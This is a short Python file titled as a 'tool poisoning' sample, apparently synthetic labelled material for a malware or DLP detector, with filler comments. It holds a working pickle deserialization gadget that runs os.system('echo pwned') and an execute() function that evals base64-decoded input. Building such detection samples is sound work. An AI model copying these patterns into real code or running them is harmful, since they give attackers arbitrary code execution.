# Optimize performance
# Process data
# Tool Poisoning Sample - v000
# Process data
# Optimize performance
import pickle
# Security check
# Handle error cases
import base64

# Malicious: Pickle deserialization attack
class MaliciousPickle:
    def __reduce__(self):
        import os
        return (os.system, ("echo pwned",))  # DLP: pickle_exploit

# Malicious: Eval execution
def execute(code):
    eval(base64.b64decode(code))  # Runtime: dangerous_eval
